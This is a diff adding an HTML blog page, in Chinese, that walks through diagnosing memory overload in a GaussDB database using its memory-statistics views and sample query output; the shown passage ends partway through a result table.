@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>GaussDB内存过载分析 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">GaussDB内存过载分析</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="markdown_views prism-tomorrow-night-eighties">
+                    
+                        
+                    
+                    <h1>
+<a id="_0"></a>问题现象</h1> 
+<ol>
+<li>数据库进程内存占比较高 
+  <ul>
+<li>长时间占比较高<br> 观察监控平台内存占用的变化曲线，无论当前数据库是否有业务在运行，数据库进程内存占总机器内存的比例长时间处于较高状态，且不下降。</li>
+<li>执行作业期间占比较高<br> 数据库进程在没有业务执行时，内存使用持续处于较低的状态，当有业务执行时，内存占用升高，待作业执行结束后，内存又恢复到较低的状态。</li>
+<li>内存上涨不下降<br> 数据库进程在执行业务过程中内存呈缓慢上涨趋势，且业务执行完后无下降趋势。</li>
+</ul> </li>
+<li>SQL语句报内存不足错误<br> 执行SQL语句报内存不足的错误，如下所示。</li>
+</ol> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from gs_shared_memory_detail group by contextname order by sum desc limit 10; </span>
+ERROR:  memory <span class="token operator">is</span> temporarily unavailable 
+DETAIL:  Failed <span class="token keyword">on</span> request <span class="token keyword">of</span> size <span class="token number">46</span> bytes under queryid <span class="token number">281475005884780</span> <span class="token operator">in</span> heaptuple<span class="token punctuation">.</span>cpp:<span class="token number">1934.</span>
+</code></pre> 
+<h1>
+<a id="_15"></a>原因分析</h1> 
+<p>如果出现集群内存不足或者长时间内存占用处于较高状态的情况，一般是由以下几种原因造成的。</p> 
+<ol>
+<li>内存堆积<br> 当SQL语句执行过程中临时内存未及时释放时，会导致内存堆积。</li>
+<li>并发过高导致内存占用过高<br> 客户端向server端建立的连接数过多，导致server端创建了大量的session，占用大量内存，这种场景下会出现内存出现占用较高的情况。</li>
+<li>单条SQL语句内存占用较高<br> 对于部分SQL语句，执行过程中会使用大量的内存，导致内存出现短暂性上涨，如复杂的存储过程语句，执行时内存占用可能达到几十GB大小。</li>
+<li>内存缓存过多<br> GaussDB Kernel引入了jemalloc开源库来管理内存管理，但是jemalloc在面对大量的内存碎片时会存在内存持续缓存不释放的问题，导致数据库进程使用的内存远远超过了实际使用的内存，具体表现为使用内存视图pv_total_memory_detail查询时，other_used_memory占用过大。如下所示。</li>
+</ol> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from pv_total_memory_detail; </span>
+ nodename       <span class="token operator">|</span>       memorytype        <span class="token operator">|</span> memorymbytes 
+<span class="token comment">----------------+-------------------------+-------------- </span>
+ coordinator1   <span class="token operator">|</span> max_process_memory      <span class="token operator">|</span>        <span class="token number">81920</span> 
+ coordinator1   <span class="token operator">|</span> process_used_memory     <span class="token operator">|</span>        <span class="token number">14567</span> 
+ coordinator1   <span class="token operator">|</span> max_dynamic_memory      <span class="token operator">|</span>        <span class="token number">34012</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_used_memory     <span class="token operator">|</span>         <span class="token number">1851</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_peak_memory     <span class="token operator">|</span>         <span class="token number">3639</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_used_shrctx     <span class="token operator">|</span>          <span class="token number">394</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_peak_shrctx     <span class="token operator">|</span>          <span class="token number">399</span> 
+ coordinator1   <span class="token operator">|</span> max_backend_memory      <span class="token operator">|</span>          <span class="token number">648</span> 
+ coordinator1   <span class="token operator">|</span> backend_used_memory     <span class="token operator">|</span>            <span class="token number">1</span> 
+ coordinator1   <span class="token operator">|</span> max_shared_memory       <span class="token operator">|</span>        <span class="token number">46747</span> 
+ coordinator1   <span class="token operator">|</span> shared_used_memory      <span class="token operator">|</span>        <span class="token number">11618</span> 
+ coordinator1   <span class="token operator">|</span> max_cstore_memory       <span class="token operator">|</span>          <span class="token number">512</span> 
+ coordinator1   <span class="token operator">|</span> cstore_used_memory      <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> max_sctpcomm_memory     <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> sctpcomm_used_memory    <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> sctpcomm_peak_memory    <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> other_used_memory       <span class="token operator">|</span>         <span class="token number">1013</span> 
+ coordinator1   <span class="token operator">|</span> gpu_max_dynamic_memory  <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> gpu_dynamic_used_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> gpu_dynamic_peak_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> pooler_conn_memory      <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> pooler_freeconn_memory  <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> storage_compress_memory <span class="token operator">|</span>            <span class="token number">0</span>  
+ coordinator1   <span class="token operator">|</span> udf_reserved_memory     <span class="token operator">|</span>            <span class="token number">0</span> 
+<span class="token punctuation">(</span><span class="token number">24</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<h1>
+<a id="_55"></a>定位思路</h1> 
+<p>出现内存过载的问题时，如果有内存过载的环境可以实时定位，可以使用思路一中的定位流程定位内存问题，如果现场环境已经被破坏（集群重启等导致），则按照思路二中的流程进行定位。当前GaussDB Kernel的内存管理采用内存上下文机制管理，在内存使用的统计上有着精准的统计和可视化的视图方便查询定位。</p> 
+<h2>
+<a id="_57"></a>思路一：有现场环境</h2> 
+<ol><li>查询内存统计信息<br> 表：信息说明</li></ol> 
+<table>
+<thead><tr>
+<th>视图</th>
+<th>说明</th>
+</tr></thead>
+<tbody>
+<tr>
+<td>pv_total_memory_detail</td>
+<td>全局内存信息概况。</td>
+</tr>
+<tr>
+<td>pg_shared_memory_detail</td>
+<td>全局内存上下文内存使用详情。</td>
+</tr>
+<tr>
+<td>pv_thread_memory_context</td>
+<td>线程级内存上下文内存使用详情。</td>
+</tr>
+<tr>
+<td>pv_session_memory_context session</td>
+<td>session级内存上下文使用详情，仅在线程池模式开启时生效。</td>
+</tr>
+</tbody>
+</table> 
+<ol start="2"><li>确定内存占用分类<br> 根据查询内存统计信息中查询出的内存统计视图结果，根据内存统计视图可以分析出如下结果。<br> 表：分析结果</li></ol> 
+<table>
+<thead><tr>
+<th>视图</th>
+<th>结果</th>
+</tr></thead>
+<tbody>
+<tr>
+<td>process_used_memory</td>
+<td>数据库进程所使用的内存大小。</td>
+</tr>
+<tr>
+<td>dynamic_used_memory</td>
+<td>已使用的动态内存。</td>
+</tr>
+<tr>
+<td>dynamic_used_shrctx</td>
+<td>全局内存上下文已使用的动态内存。</td>
+</tr>
+<tr>
+<td>shared_used_memory</td>
+<td>已使用的共享内存。</td>
+</tr>
+<tr>
+<td>other_used_memory</td>
+<td>其他已使用的内存大小，一般进程释放后被缓存起来的内存会统计在内。</td>
+</tr>
+</tbody>
+</table> 
+<ul>
+<li>如果dynamic_used_memory较大，dynamic_used_shrctx较小，则可以确认是线程和session上内存占用较多，则直接查询线程和session上的内存上下文的内存占用即可确认内存堆积的具体内存上下文。</li>
+<li>如果dynamic_used_memory较大，dynamic_used_shrctx和dynamic_used_memory相差不大，则可以确认是全局内存上下文使用的动态内存较大，直接查询全局的内存上下文的内存占用即可确认内存堆积的具体内存上下文。</li>
+<li>如果只有shared_used_memory占用较大，则可以确认是共享内存占用较多，忽略即可。</li>
+<li>如果是other_used_memory较大，一般情况下应该是出现了频繁的内存申请和释放的业务导致内存碎片缓存过多，此时需要联系华为工程师定位解决。</li>
+</ul> 
+<ol start="3"><li>确定内存堆积原因<br> 根据确定内存占用分类中查询出来的内存统计信息数据就可以确认数据库进程内存使用过高的原因，一般内存占用较高都是由如下2类原因导致。<br> 表：内存较高原因<br> <img src="https://images2.imgbox.com/65/d9/364dhOgI_o.png" alt="在这里插入图片描述">
+</li></ol> 
+<h2>
+<a id="_89"></a>思路二：无现场环境</h2> 
+<p>某些内存过载出现时会导致集群环境重启等，这种情况下没有实时的环境能够定位内存过载的原因是什么，就需要使用如下流程来定位已发生过的内存过载导致的原因。</p> 
+<ol>
+<li>查看历史内存占用曲线<br> 在环境上查看数据库进程使用内存大小的监控数据。根据数据库在一段时间内的内存变化曲线，可以确认内存过载的时间节点，如下图所示。<br> <img src="https://images2.imgbox.com/04/34/fahsaX4U_o.png" alt="在这里插入图片描述"><br> 从历史内存曲线中，可以看出在8月22日内存出现瞬间上涨的情况。</li>
+<li>分析历史内存统计信息<br> 根据查看历史内存占用曲线中确认的时间节点信息，使用视图gs_get_history_memory_detail可获得该时间节点的内存快照日志，快照日志以时间戳作为文件名，能够迅速查找，根据快照日志能够快速的找到内存居高的内存上下文信息，然后联系华为工程师协助即可解决。<br> 如果没有在历史内存统计信息中找到对应时间节点的内存快照信息，此时需要关注该时间节点业务的并发量，执行语句的复杂度等，根据实际业务情况进一步分析内存上涨的原因，需联系华为工程师协助解决。</li>
+</ol> 
+<h1>
+<a id="_98"></a>处理方法</h1> 
+<p>遇到内存占用过高或者内存不足报错的场景时可以通过如下流程来分析定位原因并解决。</p> 
+<h2>
+<a id="1_100"></a>1.获取内存统计信息</h2> 
+<p>必须要获取出现内存故障的数据库进程上的内存统计信息。</p> 
+<ul><li>实时内存统计信息<br> 查询GaussDB Kernel进程总的内存统计信息。</li></ul> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from pv_total_memory_detail; </span>
+ nodename       <span class="token operator">|</span>       memorytype        <span class="token operator">|</span> memorymbytes 
+<span class="token comment">----------------+-------------------------+-------------- </span>
+ coordinator1   <span class="token operator">|</span> max_process_memory      <span class="token operator">|</span>        <span class="token number">81920</span> 
+ coordinator1   <span class="token operator">|</span> process_used_memory     <span class="token operator">|</span>        <span class="token number">14567</span> 
+ coordinator1   <span class="token operator">|</span> max_dynamic_memory      <span class="token operator">|</span>        <span class="token number">34012</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_used_memory     <span class="token operator">|</span>         <span class="token number">1851</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_peak_memory     <span class="token operator">|</span>         <span class="token number">3639</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_used_shrctx     <span class="token operator">|</span>          <span class="token number">394</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_peak_shrctx     <span class="token operator">|</span>          <span class="token number">399</span> 
+ coordinator1   <span class="token operator">|</span> max_backend_memory      <span class="token operator">|</span>          <span class="token number">648</span> 
+ coordinator1   <span class="token operator">|</span> backend_used_memory     <span class="token operator">|</span>            <span class="token number">1</span> 
+ coordinator1   <span class="token operator">|</span> max_shared_memory       <span class="token operator">|</span>        <span class="token number">46747</span> 
+ coordinator1   <span class="token operator">|</span> shared_used_memory      <span class="token operator">|</span>        <span class="token number">11618</span> 
+ coordinator1   <span class="token operator">|</span> max_cstore_memory       <span class="token operator">|</span>          <span class="token number">512</span> 
+ coordinator1   <span class="token operator">|</span> cstore_used_memory      <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> max_sctpcomm_memory     <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> sctpcomm_used_memory    <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> sctpcomm_peak_memory    <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> other_used_memory       <span class="token operator">|</span>         <span class="token number">1013</span> 
+ coordinator1   <span class="token operator">|</span> gpu_max_dynamic_memory  <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> gpu_dynamic_used_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> gpu_dynamic_peak_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> pooler_conn_memory      <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> pooler_freeconn_memory  <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> storage_compress_memory <span class="token operator">|</span>            <span class="token number">0</span>  
+ coordinator1   <span class="token operator">|</span> udf_reserved_memory     <span class="token operator">|</span>            <span class="token number">0</span> 
+<span class="token punctuation">(</span><span class="token number">24</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>查看数据库进程全局的内存上下文占用大小，按照内存上下文分类从大到小排序，取top10即可。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from pg_shared_memory_detail group by contextname order by sum desc limit 10; </span>
+            contextname            <span class="token operator">|</span>         sum          <span class="token operator">|</span>       ?<span class="token keyword">column</span>?        <span class="token operator">|</span> count 
+<span class="token comment">-----------------------------------+----------------------+-----------------------+------- </span>
+ IncreCheckPointContext            <span class="token operator">|</span> <span class="token number">250.8796234130859375</span> <span class="token operator">|</span> <span class="token number">.00273132324218750000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ AshContext                        <span class="token operator">|</span>  <span class="token number">64.0950317382812500</span> <span class="token operator">|</span> <span class="token number">.00772094726562500000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ DefaultTopMemoryContext           <span class="token operator">|</span>  <span class="token number">60.5699005126953125</span> <span class="token operator">|</span>    <span class="token number">1.0594177246093750</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ StorageTopMemoryContext           <span class="token operator">|</span>  <span class="token number">16.7601776123046875</span> <span class="token operator">|</span> <span class="token number">.05357360839843750000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ GlobalAuditMemory                 <span class="token operator">|</span>  <span class="token number">16.0081176757812500</span> <span class="token operator">|</span> <span class="token number">.00769042968750000000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ CBBTopMemoryContext               <span class="token operator">|</span>  <span class="token number">14.9503479003906250</span> <span class="token operator">|</span> <span class="token number">.04009246826171875000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ Undo                              <span class="token operator">|</span>   <span class="token number">8.6680450439453125</span> <span class="token operator">|</span> <span class="token number">.21752929687500000000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ DoubleWriteContext                <span class="token operator">|</span>   <span class="token number">6.5549163818359375</span> <span class="token operator">|</span> <span class="token number">.02331542968750000000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ ThreadPoolContext                 <span class="token operator">|</span>   <span class="token number">5.4042663574218750</span> <span class="token operator">|</span> <span class="token number">.00525665283203125000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ GlobalSysDBCacheEntryMemCxt_16384 <span class="token operator">|</span>   <span class="token number">4.2232666015625000</span> <span class="token operator">|</span> <span class="token number">.89799499511718750000</span> <span class="token operator">|</span>    <span class="token number">16</span> 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>查看数据库进程所有线程的内存上下文占用大小，按照内存上下文分类从大到小排序，取top10即可。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from pv_thread_memory_context group by contextname order by sum desc limit 10; </span>
+           contextname           <span class="token operator">|</span>         sum          <span class="token operator">|</span>       ?<span class="token keyword">column</span>?        <span class="token operator">|</span> count 
+<span class="token comment">---------------------------------+----------------------+-----------------------+------- </span>
+ LocalSysCacheShareMemoryContext <span class="token operator">|</span> <span class="token number">612.5096435546875000</span> <span class="token operator">|</span>   <span class="token number">57.4630737304687500</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ StorageTopMemoryContext         <span class="token operator">|</span> <span class="token number">311.8157348632812500</span> <span class="token operator">|</span>    <span class="token number">3.2519149780273438</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ DefaultTopMemoryContext         <span class="token operator">|</span> <span class="token number">168.5756530761718750</span> <span class="token operator">|</span>   <span class="token number">10.7153015136718750</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ LocalSysCacheMyDBMemoryContext  <span class="token operator">|</span> <span class="token number">167.4375000000000000</span> <span class="token operator">|</span>   <span class="token number">65.7499847412109375</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ ThreadTopMemoryContext          <span class="token operator">|</span> <span class="token number">161.4440002441406250</span> <span class="token operator">|</span>    <span class="token number">4.0309295654296875</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ CBBTopMemoryContext             <span class="token operator">|</span> <span class="token number">109.1161880493164063</span> <span class="token operator">|</span>    <span class="token number">6.7845993041992188</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ LocalSysCacheTopMemoryContext   <span class="token operator">|</span>  <span class="token number">93.4109802246093750</span> <span class="token operator">|</span>   <span class="token number">13.2236938476562500</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ Timezones                       <span class="token operator">|</span>  <span class="token number">43.2421417236328125</span> <span class="token operator">|</span>    <span class="token number">1.4333953857421875</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ gs_signal                       <span class="token operator">|</span>  <span class="token number">32.2394561767578125</span> <span class="token operator">|</span>    <span class="token number">4.9155120849609375</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ <span class="token keyword">Type</span> information cache          <span class="token operator">|</span>  <span class="token number">22.9119262695312500</span> <span class="token operator">|</span> <span class="token number">.86848449707031250000</span> <span class="token operator">|</span>   <span class="token number">329</span> 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>查看数据库进程所有session的内存上下文占用大小，按照内存上下文分类从大到小排序，取top10即可。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from pv_session_memory_context group by contextname order by sum desc limit 10; </span>
+       contextname       <span class="token operator">|</span>         sum          <span class="token operator">|</span>       ?<span class="token keyword">column</span>?        <span class="token operator">|</span> count 
+<span class="token comment">-------------------------+----------------------+-----------------------+------- </span>
+ CachedPlan              <span class="token operator">|</span> <span class="token number">223.4433593750000000</span> <span class="token operator">|</span>   <span class="token number">64.6083068847656250</span> <span class="token operator">|</span> <span class="token number">12394</span> 
+ CachedPlanQuery         <span class="token operator">|</span> <span class="token number">134.7382812500000000</span> <span class="token operator">|</span>   <span class="token number">42.3366699218750000</span> <span class="token operator">|</span> <span class="token number">12596</span> 
+ SessionTopMemoryContext <span class="token operator">|</span> <span class="token number">132.3496398925781250</span> <span class="token operator">|</span>   <span class="token number">25.9272155761718750</span> <span class="token operator">|</span>   <span class="token number">302</span> 
+ CachedPlanSource        <span class="token operator">|</span>  <span class="token number">98.6943359375000000</span> <span class="token operator">|</span>   <span class="token number">28.3841018676757813</span> <span class="token operator">|</span> <span class="token number">12897</span> 
+ CBBTopMemoryContext     <span class="token operator">|</span>  <span class="token number">60.6870880126953125</span> <span class="token operator">|</span>    <span class="token number">3.0470962524414063</span> <span class="token operator">|</span>   <span class="token number">302</span> 
+ GenericRoot             <span class="token operator">|</span>  <span class="token number">35.1962890625000000</span> <span class="token operator">|</span>   <span class="token number">14.1624069213867188</span> <span class="token operator">|</span>   <span class="token number">471</span> 
+ Timezones               <span class="token operator">|</span>  <span class="token number">24.0499572753906250</span> <span class="token operator">|</span> <span class="token number">.79721069335937500000</span> <span class="token operator">|</span>   <span class="token number">302</span> 
+ SPI <span class="token keyword">Plan</span>                <span class="token operator">|</span>  <span class="token number">21.0664062500000000</span> <span class="token operator">|</span>    <span class="token number">6.8149719238281250</span> <span class="token operator">|</span>  <span class="token number">2396</span> 
+ AdaptiveCachedPlan      <span class="token operator">|</span>  <span class="token number">17.5449218750000000</span> <span class="token operator">|</span>    <span class="token number">4.7733078002929688</span> <span class="token operator">|</span>   <span class="token number">546</span> 
+ Prepared Queries        <span class="token operator">|</span>  <span class="token number">16.4062500000000000</span> <span class="token operator">|</span>    <span class="token number">7.5508117675781250</span> <span class="token operator">|</span>   <span class="token number">300</span> 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<ul><li>历史内存统计信息<br> 历史内存信息只有在没有实时现场环境的时候才会被用到，通过历史内存统计信息来定位过去发生过的内存过载的原因。<br> 查询视图gs_get_history_memory_detail可以获得数据库在过去所有时间段的内存使用超过90%时的内存使用详情，如下所示。</li></ul> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from gs_get_history_memory_detail(NULL) order by memory_info desc limit 10; </span>
+          memory_info 
+<span class="token comment">------------------------------- </span>
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205125<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205115<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205104<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205054<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205043<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205032<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205022<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205012<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_205002<span class="token punctuation">.</span>log 
+ mem_log<span class="token operator">-</span><span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">10</span>_204951<span class="token punctuation">.</span>log 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>选取其中一个log文件，执行如下查询语句即可阅览log内容，记载了全局的内存概况与全局级内存上下文，线程级内存上下文，session级内存上下的top20内存上下文占用详情，如下所示。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from gs_get_history_memory_detail('mem_log-2023-03-10_205125.log'); </span>
+                                     memory_info 
+<span class="token comment">-------------------------------------------------------------------------------------- </span>
+ { 
+         <span class="token string">"Global Memory Statistics"</span>:     { 
+                 <span class="token string">"Max_dynamic_memory"</span>:   <span class="token number">34012</span><span class="token punctuation">,</span> 
+                 <span class="token string">"Dynamic_used_memory"</span>:  <span class="token number">3645</span><span class="token punctuation">,</span> 
+                 <span class="token string">"Dynamic_peak_memory"</span>:  <span class="token number">3664</span><span class="token punctuation">,</span> 
+                 <span class="token string">"Dynamic_used_shrctx"</span>:  <span class="token number">401</span><span class="token punctuation">,</span> 
+                 <span class="token string">"Dynamic_peak_shrctx"</span>:  <span class="token number">401</span><span class="token punctuation">,</span> 
+                 <span class="token string">"Max_backend_memory"</span>:   <span class="token number">648</span><span class="token punctuation">,</span> 
+                 <span class="token string">"Backend_used_memory"</span>:  <span class="token number">1</span><span class="token punctuation">,</span> 
+                 <span class="token string">"other_used_memory"</span>:    <span class="token number">0</span> 
+         }<span class="token punctuation">,</span> 
+         <span class="token string">"Memory Context Info"</span>:  { 
+                 <span class="token string">"Memory Context Detail"</span>:        { 
+                         <span class="token string">"Context Type"</span>: <span class="token string">"Shared Memory Context"</span><span class="token punctuation">,</span> 
+                         <span class="token string">"Memory Context"</span>:       { 
+                                 <span class="token string">"context"</span>:      <span class="token string">"IncreCheckPointContext"</span><span class="token punctuation">,</span> 
+                                 <span class="token string">"freeSize"</span>:     <span class="token number">2864</span><span class="token punctuation">,</span> 
+                                 <span class="token string">"totalSize"</span>:    <span class="token number">263066352</span> 
+                         }<span class="token punctuation">,</span> 
+						<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
+                 }<span class="token punctuation">,</span> 
+                 <span class="token string">"Memory Context Detail"</span>:        { 
+                         <span class="token string">"Context Type"</span>: <span class="token string">"Session Memory Context"</span><span class="token punctuation">,</span> 
+                         <span class="token string">"Memory Context"</span>:       { 
+                                 <span class="token string">"context"</span>:      <span class="token string">"CachedPlan"</span><span class="token punctuation">,</span> 
+                                 <span class="token string">"freeSize"</span>:     <span class="token number">68041368</span><span class="token punctuation">,</span> 
+                                 <span class="token string">"totalSize"</span>:    <span class="token number">235937792</span> 
+                         }<span class="token punctuation">,</span> 
+                         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
+                 }<span class="token punctuation">,</span> 
+                 <span class="token string">"Memory Context Detail"</span>:        { 
+                         <span class="token string">"Context Type"</span>: <span class="token string">"Thread Memory Context"</span><span class="token punctuation">,</span> 
+                         <span class="token string">"Memory Context"</span>:       { 
+                                 <span class="token string">"context"</span>:      <span class="token string">"LocalSysCacheShareMemoryContext"</span><span class="token punctuation">,</span> 
+                                 <span class="token string">"freeSize"</span>:     <span class="token number">60431360</span><span class="token punctuation">,</span> 
+                                 <span class="token string">"totalSize"</span>:    <span class="token number">644141760</span> 
+                         }<span class="token punctuation">,</span> 
+                         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
+                 } 
+         } 
+<span class="token punctuation">(</span><span class="token number">322</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<h2>
+<a id="2_261"></a>2.分析内存占用分类</h2> 
+<p>根据获取内存统计信息中查询获得的内存占用概况可分析如下：</p> 
+<ul>
+<li>如果dynamic_used_memory较大，dynamic_used_shrctx较小，则可以确认是线程和session上内存占用较多。</li>
+<li>如果dynamic_used_memory较大，dynamic_used_shrctx和dynamic_used_memory相差不大，则可以确认是全局内存上下文使用的动态内存较大。</li>
+<li>如果只有shared_used_memory占用较大，则可以确认是共享内存占用较多，忽略即可。</li>
+<li>如果是other_used_memory较大，一般情况是由于业务执行时频繁的内存申请和释放导致内存碎片缓存过多。</li>
+</ul> 
+<p>针对这几种种情况，分别按照下面的4类定位方法定位即可。</p> 
+<ol><li>全局内存上下文占用较高</li></ol> 
+<ul><li>有现场环境<br> 查询如下语句即可确认是哪个内存上下文占用内存较高。</li></ul> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from pg_shared_memory_detail group by contextname order by sum desc limit 10; </span>
+            contextname            <span class="token operator">|</span>         sum          <span class="token operator">|</span>       ?<span class="token keyword">column</span>?        <span class="token operator">|</span> count 
+<span class="token comment">-----------------------------------+----------------------+-----------------------+------- </span>
+ IncreCheckPointContext            <span class="token operator">|</span> <span class="token number">250.8796234130859375</span> <span class="token operator">|</span> <span class="token number">.00273132324218750000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ AshContext                        <span class="token operator">|</span>  <span class="token number">64.0950317382812500</span> <span class="token operator">|</span> <span class="token number">.00772094726562500000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ DefaultTopMemoryContext           <span class="token operator">|</span>  <span class="token number">60.5699005126953125</span> <span class="token operator">|</span>    <span class="token number">1.0594177246093750</span> <span class="token operator">|</span>     <span class="token number">1</span> 
